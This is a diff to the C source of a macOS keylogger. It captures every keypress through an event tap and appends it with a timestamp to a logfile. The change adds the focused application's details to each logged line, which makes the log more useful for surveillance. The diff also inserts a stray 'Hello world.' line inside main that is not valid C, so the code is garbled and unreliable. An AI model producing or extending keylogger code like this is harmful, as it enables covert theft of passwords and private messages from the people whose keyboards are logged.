@@ -2,7 +2,9 @@
 
 CGEventFlags lastFlags = 0;
 
+
 int main(int argc, const char *argv[]) {
+    Hello world.
 
     // Create an event tap to retrieve keypresses.
     CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
@@ -33,7 +35,6 @@ int main(int argc, const char *argv[]) {
             logfileLocation = argv[1];
         }
     }
-
     // Get the current time and open the logfile.
     time_t result = time(NULL);
     logfile = fopen(logfileLocation, "a");
@@ -54,6 +55,7 @@ int main(int argc, const char *argv[]) {
 
     return 0;
 }
+
 
 // The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
@@ -106,7 +108,8 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     bool shift = flags & kCGEventFlagMaskShift;
     bool caps = flags & kCGEventFlagMaskAlphaShift;
     time_t now = time(NULL);
-    fprintf(logfile, "%s,%ld,\n", convertKeyCode(keyCode, shift, caps), now);
+    char* focusedAppInfo = currentAppInfo();
+    fprintf(logfile, "%s,%ld,%s,\n", convertKeyCode(keyCode, shift, caps), now, focusedAppInfo);
     fflush(logfile);
     return event;
 }
@@ -231,3 +234,4 @@ const char *convertKeyCode(int keyCode, bool shift, bool caps) {
     }
     return "[unknown]";
 }
+
